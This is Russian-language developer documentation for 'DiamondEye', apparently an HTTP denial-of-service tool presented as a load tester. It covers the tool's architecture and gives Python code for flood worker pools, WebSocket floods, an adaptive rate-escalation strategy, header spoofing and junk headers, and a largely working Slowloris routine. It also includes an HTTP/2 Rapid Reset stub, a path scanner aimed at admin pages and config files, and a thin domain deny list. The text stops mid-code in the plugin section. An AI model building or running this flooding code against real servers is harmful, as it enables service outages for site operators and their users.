# 🏗️ DIAMONDEYE v9.8 — ТЕХНИЧЕСКАЯ ДОКУМЕНТАЦИЯ  
## Полное руководство по архитектуре, разработке и расширению

**Версия:** 9.8 (Development) | **Статус:** Internal Use  
**Авторы:** larion | **Дата обновления:** 2025  
**Версия документа:** 2.1  

---

## 📋 СОДЕРЖАНИЕ

1. [Обзор архитектуры](#1-обзор-архитектуры)
2. [Модуль: `main.py`](#2-модуль-mainpy)
3. [Модуль: `args.py`](#3-модуль-argspy)
4. [Модуль: `attack.py`](#4-модуль-attackpy)
5. [Модуль: `scanner.py`](#5-модуль-scannerpy)
6. [Модуль: `utils.py`](#6-модуль-utilspy)
7. [Сетевые протоколы](#7-сетевые-протоколы)
8. [Безопасность и обработка ошибок](#8-безопасность-и-обработка-ошибок)
9. [Производительность и оптимизация](#9-производительность-и-оптимизация)
10. [API для расширения](#10-api-для-расширения)
11. [Roadmap и развитие](#11-roadmap-и-развитие)
12. [Тестирование и QA](#12-тестирование-и-qa)
13. [Справочные материалы](#13-справочные-материалы)

---

## 1. ОБЗОР АРХИТЕКТУРЫ

### 1.1. Ключевые концепции

DiamondEye — это **асинхронный распределенный HTTP-тестер**, построенный на принципах:

- **Модульность**: Каждый компонент выполняет одну четкую задачу
- **Масштабируемость**: Работа от 1 до 10,000+ одновременных соединений
- **Адаптивность**: Автоматическая подстройка под ответы сервера
- **Расширяемость**: Плагинная архитектура для новых типов атак

### 1.2. Компонентная диаграмма

```
┌─────────────────────────────────────────────────────────┐
│                     КОМАНДНАЯ СТРОКА                    │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│                     args.py                             │
│  • Парсинг аргументов                                   │
│  • Валидация данных                                     │
│  • Обработка зависимостей                               │
└──────────────┬──────────────────────────────────────────┘
               │
    ┌──────────┴──────────┐
    │                     │
┌───▼──────┐      ┌──────▼──────┐
│  main.py │      │  scanner.py │
│  • Точка │      │  • Сканир-  │
│    входа │      │    ование   │
│  • Управл│      │    путей    │
│    ение  │      │  • Валидация│
└───┬──────┘      │    статусов │
    │             └─────────────┘
    │
┌───▼──────────────────────────────────────────┐
│              attack.py                       │
│  • DiamondEyeAttack (основной класс)         │
│  • Управление воркерами                      │
│  • Сбор статистики                           │
│  • Обработка протоколов (HTTP/1-3, WS)       │
└───┬──────────────────────────────────────────┘
    │
┌───▼──────┐
│ utils.py │
│ • Генера-│
│   ция    │
│ • Помощ- │
│   ные    │
│   функции│
└──────────┘
```

### 1.3. Поток данных

```python
# Псевдокод основного потока
async def main():
    args = parse_args()                    # args.py
    if args.scan:
        await start_scan(args)            # scanner.py
    else:
        attack = DiamondEyeAttack(args)    # attack.py
        await attack.start()
        
        # Параллельно:
        # 1. Worker-воркеры генерируют нагрузку
        # 2. Monitor собирает статистику
        # 3. RPS-сборщик обновляет метрики
```

### 1.4. Технологический стек

| Компонент | Технология | Назначение |
|-----------|------------|------------|
| **Асинхронность** | asyncio + uvloop | Высокопроизводительная обработка I/O |
| **HTTP-клиент** | httpx | Поддержка HTTP/1.1, HTTP/2, HTTP/3 |
| **WebSocket** | websockets | WebSocket flood атаки |
| **Парсинг аргументов** | argparse | CLI интерфейс |
| **Статистика** | matplotlib | Визуализация RPS графиков |
| **Системный мониторинг** | psutil | Контроль ресурсов системы |
| **Цветной вывод** | colorama | Улучшенная читаемость в терминале |
| **Валидация URL** | urllib.parse | Корректная обработка URL |

### 1.5. Форматы данных

**Внутренние структуры:**
```python
RPSRecord = TypedDict('RPSRecord', {
    'time': int,      # секунды от начала
    'rps': int        # запросов в секунду
})

RequestResult = TypedDict('RequestResult', {
    'url': str,
    'status': int,
    'redirect': str,
    'latency_ms': float
})
```

**Конфигурационный объект:**
```python
class AttackConfig(NamedTuple):
    url: str
    workers: int
    sockets: int
    methods: List[str]
    # ... все параметры атаки
```

---

## 2. МОДУЛЬ: `main.py`

### 2.1. Назначение и ответственности

`main.py` — **точка входа приложения**, выполняющая:
- Инициализацию event loop (uvloop/asyncio)
- Парсинг аргументов командной строки
- Выбор режима работы (сканирование/атака)
- Управление жизненным циклом приложения
- Обработку сигналов (SIGINT, SIGTERM)
- Генерацию отчетов

### 2.2. Ключевые функции

#### `async def main()`
**Основной цикл приложения:**
```python
async def main():
    # 1. Парсинг аргументов
    args = parse_args()
    
    # 2. Валидация и нормализация
    validate_and_normalize_args(args)
    
    # 3. Выбор режима
    if args.scan:
        await scanner_mode(args)
    else:
        await attack_mode(args)
    
    # 4. Генерация отчетов
    generate_reports(args, metrics)
```

#### `def generate_report(attack, duration, args)`
**Генерация текстового отчета:**
```python
def generate_report(attack, duration, args) -> str:
    """
    Форматированный отчет в виде ASCII-арта
    Включает:
    - Цель и время теста
    - Конфигурацию атаки
    - Метрики производительности
    - Рекомендации по оптимизации
    """
```

#### `def save_json_report(attack, duration, args, filepath)`
**Сохранение структурированных данных:**
```python
def save_json_report(attack, duration, args, filepath):
    """
    JSON-отчет для автоматической обработки
    Формат:
    {
        "metadata": {...},
        "configuration": {...},
        "metrics": {...},
        "timestamp": "ISO-8601"
    }
    """
```

#### `def save_plot(attack, filepath)`
**Визуализация производительности:**
```python
def save_plot(attack, filepath):
    """
    Построение графика RPS с помощью matplotlib
    Особенности:
    - Автоматическое сглаживание выбросов
    - Разметка осей и заголовок
    - Сохранение в PNG с высоким DPI
    """
```

### 2.3. Обработка сигналов

```python
def setup_signal_handlers(attack):
    """Настройка корректного завершения"""
    def signal_handler(signum, frame):
        if attack and hasattr(attack, '_shutdown_event'):
            attack._shutdown_event.set()
            print(f"\n{Fore.YELLOW}⚠️ Получен сигнал {signum}, завершение...{Style.RESET_ALL}")
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Для asyncio в Windows
    if sys.platform == 'win32':
        asyncio.get_event_loop().add_signal_handler(
            signal.SIGINT, 
            lambda: signal_handler(signal.SIGINT, None)
        )
```

### 2.4. Обработка ошибок

```python
async def attack_mode(args):
    """Режим атаки с обработкой исключений"""
    try:
        attack = DiamondEyeAttack(...)
        await attack.start()
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}🛑 Атака прервана пользователем{Style.RESET_ALL}")
    except httpx.NetworkError as e:
        print(f"{Fore.RED}🌐 Сетевая ошибка: {e}{Style.RESET_ALL}")
        log_error(f"Network error: {e}", args)
    except Exception as e:
        if args.debug:
            print(f"{Fore.RED}🔥 Критическая ошибка: {e}{Style.RESET_ALL}")
            traceback.print_exc()
        raise
```

### 2.5. Оптимизации

1. **Ленивая загрузка модулей:**
```python
# scanner.py загружается только при --scan
if args.scan:
    from scanner import start_scan  # Динамический импорт
    await start_scan(...)
```

2. **Автоматическое определение ресурсов:**
```python
# Ограничение workers на localhost
if is_localhost(args.url):
    max_workers = psutil.cpu_count() * 4
    args.workers = min(args.workers, max_workers)
```

3. **Кэширование User-Agent:**
```python
_useragent_cache = {}

def load_useragents_cached(filepath):
    if filepath not in _useragent_cache:
        _useragent_cache[filepath] = load_useragents(filepath)
    return _useragent_cache[filepath]
```

---

## 3. МОДУЛЬ: `args.py`

### 3.1. Структура аргументов

```python
# Группы аргументов для логической организации
argument_groups = {
    'scan': ['--scan', '--wordlist', '--threads', '--output'],
    'basic': ['-w', '-s', '-m', '-u', '-n', '-d'],
    'attack': ['--proxy', '--http2', '--http3', '--websocket'],
    'advanced': ['--h2reset', '--graphql-bomb', '--adaptive'],
    'reporting': ['-l', '--json', '--plot']
}
```

### 3.2. Валидация данных

#### Кастомные валидаторы:
```python
def validate_positive_int(value):
    """Валидация положительных целых чисел"""
    try:
        ivalue = int(value)
        if ivalue <= 0:
            raise argparse.ArgumentTypeError(f"Должно быть положительным: {value}")
        return ivalue
    except ValueError:
        raise argparse.ArgumentTypeError(f"Ожидается целое число: {value}")

def validate_url(value):
    """Валидация и нормализация URL"""
    if not value.startswith(('http://', 'https://')):
        value = 'https://' + value
    
    try:
        result = urlparse(value)
        if not all([result.scheme, result.netloc]):
            raise ValueError
        return value
    except:
        raise argparse.ArgumentTypeError(f"Некорректный URL: {value}")
```

### 3.3. Зависимости и конфликты

```python
def validate_argument_dependencies(args):
    """Проверка зависимостей между аргументами"""
    
    # Конфликты
    if args.http2 and args.extreme:
        print(f"{Fore.YELLOW}⚠️  --http2 несовместим с --extreme{Style.RESET_ALL}")
        args.http2 = False
    
    if args.flood and args.slow > 0:
        print(f"{Fore.YELLOW}⚠️  --flood отключает --slow{Style.RESET_ALL}")
        args.slow = 0.0
    
    # Зависимости
    if args.header_flood and not args.junk:
        print(f"{Fore.YELLOW}⚠️  --header-flood требует --junk{Style.RESET_ALL}")
        args.junk = True
    
    # Автоматические подстановки
    if args.methods and args.methods.upper() == 'ALL':
        args.methods = 'GET,POST,PUT,PATCH,OPTIONS,HEAD'
    
    return args
```

### 3.4. Поддержка конфигурационных файлов

```python
def load_config_file(filepath):
    """Загрузка конфигурации из YAML/JSON файла"""
    import yaml  # или json
    
    with open(filepath, 'r') as f:
        if filepath.endswith('.yaml') or filepath.endswith('.yml'):
            config = yaml.safe_load(f)
        else:
            config = json.load(f)
    
    # Конвертация в аргументы командной строки
    args_list = []
    for key, value in config.items():
        if isinstance(value, bool) and value:
            args_list.append(f'--{key}')
        elif isinstance(value, list):
            args_list.append(f'--{key}')
            args_list.append(','.join(str(v) for v in value))
        else:
            args_list.append(f'--{key}')
            args_list.append(str(value))
    
    return args_list
```

---

## 4. МОДУЛЬ: `attack.py`

### 4.1. Архитектура класса DiamondEyeAttack

#### 4.1.1. Иерархия состояний
```
DiamondEyeAttack
├── Настройки (Settings)
│   ├── URL и параметры цели
│   ├── Конфигурация атаки
│   └── Параметры протоколов
├── Состояние (State)
│   ├── Счетчики (sent, failed)
│   ├── История RPS
│   └── Активные задачи
├── Компоненты (Components)
│   ├── Пул воркеров
│   ├── Мониторинг
│   └── Коллектор статистики
└── Режимы (Modes)
    ├── HTTP Flood
    ├── WebSocket
    ├── Adaptive
    └── GraphQL Bomb
```

#### 4.1.2. Инициализация
```python
class DiamondEyeAttack:
    def __init__(self, **kwargs):
        # Базовые параметры
        self.url = kwargs.get('url')
        self.workers = kwargs.get('workers', 10)
        self.sockets = kwargs.get('sockets', 100)
        
        # Протоколы
        self.use_http2 = kwargs.get('use_http2', False)
        self.use_http3 = kwargs.get('use_http3', False)
        self.websocket = kwargs.get('websocket', False)
        
        # Параметры атаки
        self.extreme = kwargs.get('extreme', False)
        self.flood = kwargs.get('flood', False)
        self.slow_rate = kwargs.get('slow_rate', 0.0)
        
        # Статистика
        self.sent = 0
        self.failed = 0
        self.start_time = time.time()
        
        # Асинхронные примитивы
        self.lock = asyncio.Lock()
        self._shutdown_event = asyncio.Event()
        self.active_tasks = set()
        
        # Оптимизации
        self._client_pool = []  # Пул переиспользуемых клиентов
        self._dns_cache = {}    # Кэш DNS запросов
```

### 4.2. Система воркеров

#### 4.2.1. Worker Pool Manager
```python
class WorkerPool:
    def __init__(self, attack):
        self.attack = attack
        self.workers = []
        self.semaphore = asyncio.Semaphore(attack.workers)
    
    async def start(self):
        """Запуск пула воркеров"""
        for i in range(self.attack.workers):
            worker = Worker(worker_id=i, attack=self.attack)
            task = asyncio.create_task(worker.run())
            self.workers.append(task)
        
        # Мониторинг здоровья воркеров
        asyncio.create_task(self._health_check())
    
    async def _health_check(self):
        """Проверка состояния воркеров"""
        while not self.attack._shutdown_event.is_set():
            dead_workers = []
            for idx, worker_task in enumerate(self.workers):
                if worker_task.done():
                    dead_workers.append(idx)
            
            # Перезапуск умерших воркеров
            for idx in dead_workers:
                new_worker = Worker(worker_id=idx, attack=self.attack)
                self.workers[idx] = asyncio.create_task(new_worker.run())
            
            await asyncio.sleep(5.0)
```

#### 4.2.2. Индивидуальный Worker
```python
class Worker:
    def __init__(self, worker_id, attack):
        self.id = worker_id
        self.attack = attack
        self.client = None
        self.stats = WorkerStats()
    
    async def run(self):
        """Основной цикл воркера"""
        # Инициализация клиента
        self.client = await self._create_client()
        
        try:
            while not self.attack._shutdown_event.is_set():
                # Генерация запроса
                request = self._build_request()
                
                # Отправка с учетом политик
                if self.attack.extreme:
                    await self._send_extreme(request)
                else:
                    await self._send_normal(request)
                
                # Задержка между запросами
                await self._apply_delay()
                
        except Exception as e:
            if self.attack.debug:
                print(f"[Worker {self.id}] Ошибка: {e}")
        finally:
            await self._cleanup()
    
    def _build_request(self):
        """Построение HTTP-запроса"""
        return {
            'method': self._choose_method(),
            'url': self._build_url(),
            'headers': generate_headers(...),
            'data': self._generate_payload()
        }
```

### 4.3. Протоколы и транспорты

#### 4.3.1. HTTP/1.1, HTTP/2, HTTP/3
```python
class ProtocolManager:
    """Управление различными HTTP-протоколами"""
    
    @staticmethod
    def create_transport(config):
        """Создание транспорта в зависимости от конфигурации"""
        if config.use_http3:
            return ProtocolManager._create_http3_transport(config)
        elif config.use_http2:
            return ProtocolManager._create_http2_transport(config)
        else:
            return ProtocolManager._create_http11_transport(config)
    
    @staticmethod
    def _create_http11_transport(config):
        """HTTP/1.1 транспорт с keep-alive"""
        limits = httpx.Limits(
            max_connections=1000,
            max_keepalive_connections=100,
            keepalive_expiry=5.0
        )
        return httpx.AsyncHTTPTransport(
            limits=limits,
            retries=2
        )
    
    @staticmethod 
    def _create_http2_transport(config):
        """HTTP/2 транспорт с мультиплексированием"""
        return httpx.AsyncHTTPTransport(
            http2=True,
            limits=httpx.Limits(max_connections=1000)
        )
```

#### 4.3.2. WebSocket поддержка
```python
class WebSocketManager:
    """Управление WebSocket соединениями"""
    
    def __init__(self, attack):
        self.attack = attack
        self.connections = []
        self.message_queue = asyncio.Queue()
    
    async def connect_all(self):
        """Установка множества WebSocket соединений"""
        ws_url = self.attack.url.replace('http', 'ws')
        
        for _ in range(self.attack.workers * self.attack.sockets):
            conn_task = asyncio.create_task(
                self._single_connection(ws_url)
            )
            self.connections.append(conn_task)
    
    async def _single_connection(self, url):
        """Одно WebSocket соединение"""
        while not self.attack._shutdown_event.is_set():
            try:
                async with websockets.connect(url) as ws:
                    # Подписка на события
                    asyncio.create_task(self._receive_messages(ws))
                    
                    # Отправка сообщений
                    while not self.attack._shutdown_event.is_set():
                        message = await self._generate_message()
                        await ws.send(message)
                        await asyncio.sleep(0.1)
                        
            except Exception as e:
                if self.attack.debug:
                    print(f"[WS] Ошибка: {e}")
                await asyncio.sleep(1.0)
```

### 4.4. Стратегии атаки

#### 4.4.1. Adaptive Attack Strategy
```python
class AdaptiveStrategy:
    """Адаптивная стратегия с обратной связью"""
    
    def __init__(self, attack):
        self.attack = attack
        self.current_rps = 0
        self.target_rps = 1000
        self.failure_threshold = 0.3  # 30% ошибок
        self.samples = []
    
    async def execute(self):
        """Выполнение адаптивной атаки"""
        print(f"{Fore.CYAN}📈 Запуск адаптивной стратегии...{Style.RESET_ALL}")
        
        while not self.attack._shutdown_event.is_set():
            # Измерение текущей производительности
            metrics = await self._measure_performance()
            
            # Анализ и принятие решения
            decision = self._analyze(metrics)
            
            # Применение решения
            await self._apply_decision(decision)
            
            # Пауза между измерениями
            await asyncio.sleep(10.0)
    
    def _analyze(self, metrics):
        """Анализ метрик и принятие решения"""
        if metrics.error_rate > self.failure_threshold:
            return {'action': 'decrease', 'factor': 0.7}
        elif metrics.error_rate < 0.05:  # 5% ошибок
            return {'action': 'increase', 'factor': 1.3}
        else:
            return {'action': 'maintain'}
```

#### 4.4.2. Slowloris Strategy
```python
class SlowlorisStrategy:
    """Slowloris атака с частичными запросами"""
    
    def __init__(self, attack):
        self.attack = attack
        self.connections = []
        self.headers_sent = {}
    
    async def execute(self):
        """Выполнение Slowloris атаки"""
        print(f"{Fore.YELLOW}🐌 Запуск Slowloris...{Style.RESET_ALL}")
        
        for _ in range(self.attack.slow_connections):
            conn_task = asyncio.create_task(
                self._slow_connection()
            )
            self.connections.append(conn_task)
    
    async def _slow_connection(self):
        """Одно медленное соединение"""
        try:
            reader, writer = await asyncio.open_connection(
                self.attack.target_host,
                self.attack.target_port,
                ssl=self.attack.use_ssl
            )
            
            # Отправка частичных заголовков
            request_line = f"GET / HTTP/1.1\r\n"
            writer.write(request_line.encode())
            await writer.drain()
            
            # Постепенная отправка заголовков
            headers = self._generate_headers()
            for i, (key, value) in enumerate(headers.items()):
                if self.attack._shutdown_event.is_set():
                    break
                    
                header_line = f"{key}: {value}"
                if i < len(headers) - 1:
                    header_line += "\r\n"
                
                writer.write(header_line.encode())
                await writer.drain()
                await asyncio.sleep(random.uniform(10, 30))
                
        except Exception as e:
            if self.attack.debug:
                print(f"[Slowloris] Ошибка: {e}")
```

### 4.5. Система мониторинга

#### 4.5.1. Real-time Statistics
```python
class StatisticsCollector:
    """Сбор и агрегация статистики в реальном времени"""
    
    def __init__(self):
        self.metrics = {
            'requests': Counter(),
            'latencies': deque(maxlen=1000),
            'status_codes': Counter(),
            'errors': Counter()
        }
        self.lock = asyncio.Lock()
    
    async def record_request(self, status, latency, error=None):
        """Запись результата запроса"""
        async with self.lock:
            self.metrics['requests'].increment()
            self.metrics['latencies'].append(latency)
            self.metrics['status_codes'][status] += 1
            
            if error:
                self.metrics['errors'][type(error).__name__] += 1
    
    def get_summary(self):
        """Получение сводной статистики"""
        return {
            'total_requests': self.metrics['requests'].value,
            'avg_latency': self._calculate_avg_latency(),
            'rps': self._calculate_rps(),
            'error_rate': self._calculate_error_rate(),
            'status_distribution': dict(self.metrics['status_codes'])
        }
```

#### 4.5.2. Health Monitoring
```python
class HealthMonitor:
    """Мониторинг здоровья системы"""
    
    def __init__(self, attack):
        self.attack = attack
        self.metrics = {
            'cpu_usage': [],
            'memory_usage': [],
            'network_io': [],
            'active_connections': []
        }
    
    async def monitor(self):
        """Непрерывный мониторинг"""
        while not self.attack._shutdown_event.is_set():
            snapshot = await self._take_snapshot()
            self._store_metrics(snapshot)
            
            # Проверка порогов
            await self._check_thresholds(snapshot)
            
            await asyncio.sleep(1.0)
    
    async def _take_snapshot(self):
        """Снимок текущего состояния системы"""
        return {
            'cpu': psutil.cpu_percent(),
            'memory': psutil.virtual_memory().percent,
            'connections': len(self.attack.active_tasks),
            'network': psutil.net_io_counters()
        }
```

---

## 5. МОДУЛЬ: `scanner.py`

### 5.1. Архитектура сканера

```python
class PathScanner:
    """Сканер путей с расширенными возможностями"""
    
    def __init__(self, target, config):
        self.target = target
        self.config = config
        self.found_paths = []
        self.queue = asyncio.Queue()
        self.visited = set()
        self.session = None
    
    async def scan(self):
        """Основной метод сканирования"""
        print(f"{Fore.CYAN}🔍 Начало сканирования {self.target}{Style.RESET_ALL}")
        
        # Инициализация сессии
        self.session = await self._create_session()
        
        # Загрузка wordlist
        paths = self._load_wordlist()
        
        # Запуск воркеров
        workers = [
            asyncio.create_task(self._scanner_worker(i))
            for i in range(self.config.threads)
        ]
        
        # Добавление начальных путей в очередь
        for path in paths:
            await self.queue.put(path)
        
        # Ожидание завершения
        await self.queue.join()
        
        # Остановка воркеров
        for worker in workers:
            worker.cancel()
        
        # Сохранение результатов
        await self._save_results()
        
        print(f"{Fore.GREEN}✅ Сканирование завершено: {len(self.found_paths)} путей{Style.RESET_ALL}")
```

### 5.2. Алгоритмы сканирования

#### 5.2.1. Breadth-First Search с ограничениями
```python
async def bfs_scan(self, start_paths, max_depth=3):
    """Поиск в ширину с ограничением глубины"""
    queue = deque([(path, 0) for path in start_paths])  # (path, depth)
    
    while queue and not self._shutdown_event.is_set():
        path, depth = queue.popleft()
        
        if depth >= max_depth:
            continue
        
        # Проверка текущего пути
        result = await self._check_path(path)
        
        if result.found:
            self.found_paths.append(result)
            
            # Добавление связанных путей
            if result.links:
                for link in result.links:
                    if link not in self.visited:
                        queue.append((link, depth + 1))
                        self.visited.add(link)
```

#### 5.2.2. Интеллектуальное расписание
```python
class SmartScheduler:
    """Умное расписание запросов для избегания блокировок"""
    
    def __init__(self, max_rate=50):
        self.max_rate = max_rate  # запросов в секунду
        self.last_request_time = 0
        self.request_times = deque(maxlen=100)
    
    async def wait_if_needed(self):
        """Ожидание если превышен лимит скорости"""
        now = time.time()
        
        # Удаление старых записей
        while self.request_times and self.request_times[0] < now - 1:
            self.request_times.popleft()
        
        # Проверка лимита
        if len(self.request_times) >= self.max_rate:
            sleep_time = 1.0 - (now - self.request_times[0])
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)
        
        self.request_times.append(time.time())
```

### 5.3. Обнаружение и классификация

```python
class PathClassifier:
    """Классификация найденных путей"""
    
    PATTERN_DATABASE = {
        'admin': ['/admin', '/administrator', '/wp-admin'],
        'api': ['/api/', '/rest/', '/graphql'],
        'files': ['/uploads/', '/files/', '/assets/'],
        'config': ['.env', 'config.php', 'web.config']
    }
    
    @classmethod
    def classify(cls, path, response):
        """Классификация пути по ответу"""
        classifications = []
        
        # По URL
        for category, patterns in cls.PATTERN_DATABASE.items():
            if any(pattern in path for pattern in patterns):
                classifications.append(category)
        
        # По заголовкам
        if 'X-Powered-By' in response.headers:
            classifications.append('technology_leak')
        
        # По статусу
        if response.status == 403:
            classifications.append('forbidden')
        elif response.status == 500:
            classifications.append('error')
        
        return classifications
```

---

## 6. МОДУЛЬ: `utils.py`

### 6.1. Генерация HTTP-заголовков

```python
class HeaderFactory:
    """Фабрика HTTP-заголовков"""
    
    # База данных User-Agent
    USER_AGENTS = {
        'desktop': [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ],
        'mobile': [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 11; Mobile) AppleWebKit/537.36'
        ],
        'bot': [
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
        ]
    }
    
    @classmethod
    def create_headers(cls, config):
        """Создание набора заголовков"""
        headers = cls._base_headers(config)
        
        if config.randomize_ua:
            headers['User-Agent'] = cls._random_user_agent(config.ua_type)
        
        if config.junk_headers:
            headers.update(cls._generate_junk_headers(config.junk_count))
        
        if config.spoof_referer:
            headers['Referer'] = cls._random_referer()
        
        return headers
    
    @classmethod
    def _generate_junk_headers(cls, count):
        """Генерация мусорных заголовков"""
        junk = {}
        for _ in range(count):
            key = f"X-{random_string(8)}"
            value = random_string(random.randint(5, 50))
            junk[key] = value
        return junk
```

### 6.2. Обработка данных

```python
class DataProcessor:
    """Обработка и преобразование данных"""
    
    @staticmethod
    def parse_size_string(size_str):
        """
        Парсинг строковых представлений размера
        Поддерживает: 1k, 64kb, 1.5m, 2mb, 1024
        """
        size_str = size_str.strip().lower()
        
        # Регулярное выражение для парсинга
        pattern = r'^(\d+(?:\.\d+)?)\s*([kmgtp]?b?)?$'
        match = re.match(pattern, size_str)
        
        if not match:
            raise ValueError(f"Invalid size format: {size_str}")
        
        value, unit = match.groups()
        value = float(value)
        
        multipliers = {
            'k': 1024,
            'm': 1024**2,
            'g': 1024**3,
            't': 1024**4,
            'p': 1024**5
        }
        
        if unit:
            # Извлекаем первую букву (k, m, g, t, p)
            unit_char = unit[0].lower()
            if unit_char in multipliers:
                return int(value * multipliers[unit_char])
        
        return int(value)
    
    @staticmethod
    def generate_payload(size, payload_type='random'):
        """Генерация полезной нагрузки"""
        generators = {
            'random': lambda s: random_string(s),
            'json': lambda s: DataProcessor._generate_json_payload(s),
            'xml': lambda s: DataProcessor._generate_xml_payload(s),
            'form': lambda s: DataProcessor._generate_form_payload(s)
        }
        
        generator = generators.get(payload_type, generators['random'])
        return generator(size)
```

---

## 7. СЕТЕВЫЕ ПРОТОКОЛЫ

### 7.1. HTTP/1.1 Реализация

```python
class HTTP11Handler:
    """Обработчик HTTP/1.1 с keep-alive"""
    
    def __init__(self, config):
        self.config = config
        self.connections = {}
        self.connection_pool = ConnectionPool(max_size=100)
    
    async def send_request(self, request):
        """Отправка HTTP/1.1 запроса"""
        # Получение соединения из пула
        connection = await self._get_connection(request.url)
        
        try:
            # Формирование запроса
            raw_request = self._build_raw_request(request)
            
            # Отправка
            await connection.write(raw_request)
            
            # Чтение ответа
            response = await self._read_response(connection)
            
            return response
            
        except Exception as e:
            # Повторное использование или создание нового соединения
            await self._handle_connection_error(connection, e)
            raise
```

### 7.2. HTTP/2 Реализация

```python
class HTTP2Handler:
    """Обработчик HTTP/2 с мультиплексированием"""
    
    async def send_requests(self, requests):
        """Отправка множества запросов через одно соединение"""
        async with httpx.AsyncClient(http2=True) as client:
            tasks = []
            for request in requests:
                task = asyncio.create_task(
                    self._send_single_request(client, request)
                )
                tasks.append(task)
            
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            return responses
    
    async def rapid_reset(self, client, target_url):
        """HTTP/2 Rapid Reset атака"""
        # Создание множества stream'ов
        streams = []
        for i in range(1000):
            stream_id = i * 2 + 1
            # Отправка HEADERS с флагом END_STREAM
            # Немедленный RST_STREAM
            # Повторное использование stream id
            pass
```

### 7.3. QUIC/HTTP3 Поддержка

```python
class HTTP3Handler:
    """Экспериментальная поддержка HTTP/3"""
    
    def __init__(self):
        try:
            import aioquic
            self.quic_available = True
        except ImportError:
            self.quic_available = False
    
    async def connect(self, url):
        """Установка QUIC соединения"""
        if not self.quic_available:
            raise RuntimeError("aioquic не установлен")
        
        # Парсинг URL
        parsed = urlparse(url)
        
        # Создание QUIC соединения
        configuration = QuicConfiguration(
            is_client=True,
            verify_mode=ssl.CERT_NONE
        )
        
        async with connect(
            parsed.hostname,
            parsed.port or 443,
            configuration=configuration
        ) as protocol:
            return protocol
```

---

## 8. БЕЗОПАСНОСТЬ И ОБРАБОТКА ОШИБОК

### 8.1. Безопасное программирование

```python
class SecurityManager:
    """Менеджер безопасности и валидации"""
    
    @staticmethod
    def validate_target(target):
        """Валидация цели для предотвращения непреднамеренного использования"""
        forbidden_domains = [
            '.gov.', '.mil.', '.bank.',
            'google.com', 'facebook.com',
            'cloudflare.com', 'amazon.com'
        ]
        
        parsed = urlparse(target)
        domain = parsed.netloc.lower()
        
        for forbidden in forbidden_domains:
            if forbidden in domain:
                raise SecurityError(f"Доступ к {domain} запрещен")
        
        # Проверка localhost для тестов
        if domain in ['localhost', '127.0.0.1', '0.0.0.0']:
            print(f"{Fore.YELLOW}⚠️  Предупреждение: тестирование localhost{Style.RESET_ALL}")
    
    @staticmethod
    def sanitize_headers(headers):
        """Санатизация заголовков от потенциально опасных значений"""
        sanitized = {}
        for key, value in headers.items():
            # Удаление управляющих символов
            clean_key = re.sub(r'[\x00-\x1f\x7f]', '', key)
            clean_value = re.sub(r'[\x00-\x1f\x7f]', '', str(value))
            sanitized[clean_key] = clean_value
        return sanitized
```

### 8.2. Обработка ошибок

```python
class ErrorHandler:
    """Централизованная обработка ошибок"""
    
    ERROR_CATEGORIES = {
        'network': [TimeoutError, ConnectionError, httpx.NetworkError],
        'protocol': [httpx.ProtocolError, httpx.DecodingError],
        'ssl': [ssl.SSLError, httpx.SSLContextError],
        'resource': [MemoryError, OSError],
        'validation': [ValueError, TypeError]
    }
    
    @classmethod
    def handle(cls, error, context=None):
        """Обработка ошибки с учетом контекста"""
        # Классификация ошибки
        category = cls._categorize_error(error)
        
        # Логирование
        cls._log_error(error, category, context)
        
        # Восстановление или эскалация
        if cls._is_recoverable(error, category):
            return cls._recover(error, context)
        else:
            raise cls._wrap_error(error, category)
    
    @classmethod
    def _categorize_error(cls, error):
        """Категоризация ошибки"""
        for category, error_types in cls.ERROR_CATEGORIES.items():
            if any(isinstance(error, et) for et in error_types):
                return category
        return 'unknown'
```

---

## 9. ПРОИЗВОДИТЕЛЬНОСТЬ И ОПТИМИЗАЦИЯ

### 9.1. Профилирование и мониторинг

```python
class PerformanceMonitor:
    """Мониторинг производительности в реальном времени"""
    
    def __init__(self):
        self.metrics = defaultdict(list)
        self.start_time = time.time()
    
    def record_metric(self, name, value):
        """Запись метрики"""
        self.metrics[name].append({
            'timestamp': time.time(),
            'value': value
        })
    
    def get_performance_report(self):
        """Генерация отчета о производительности"""
        report = {
            'duration': time.time() - self.start_time,
            'rps': self._calculate_rps(),
            'latency': self._calculate_latency_stats(),
            'throughput': self._calculate_throughput(),
            'efficiency': self._calculate_efficiency()
        }
        return report
    
    def suggest_optimizations(self):
        """Предложения по оптимизации на основе метрик"""
        suggestions = []
        
        if self._is_cpu_bound():
            suggestions.append("Увеличить количество workers")
        
        if self._is_io_bound():
            suggestions.append("Использовать HTTP/2 для мультиплексирования")
        
        if self._is_network_bound():
            suggestions.append("Уменьшить размер запросов")
        
        return suggestions
```

### 9.2. Оптимизация памяти

```python
class MemoryOptimizer:
    """Оптимизатор использования памяти"""
    
    @staticmethod
    def optimize_attack(attack):
        """Оптимизация атаки для снижения потребления памяти"""
        
        # 1. Использование генераторов вместо списков
        def request_generator():
            while True:
                yield build_random_request()
        
        # 2. Ограничение размера кэшей
        import functools
        @functools.lru_cache(maxsize=1000)
        def cached_generation(key):
            return generate_complex_value(key)
        
        # 3. Использование слабых ссылок
        import weakref
        cache = weakref.WeakValueDictionary()
        
        # 4. Пакетная обработка
        BATCH_SIZE = 1000
        for i in range(0, total_requests, BATCH_SIZE):
            batch = requests[i:i+BATCH_SIZE]
            process_batch(batch)
```

---

## 10. API ДЛЯ РАСШИРЕНИЯ

### 10.1. Плагинная архитектура

```python
# plugins/__init__.py
class Plugin:
    """Базовый класс для плагинов"""
    
    def __init__(self, attack):
        self.attack = attack
        self.name = self.__class__.__name__
    
    async def initialize(self):
        """Инициализация плагина"""
        pass
    
    async def execute(self):
        """Выполнение логики плагина"""
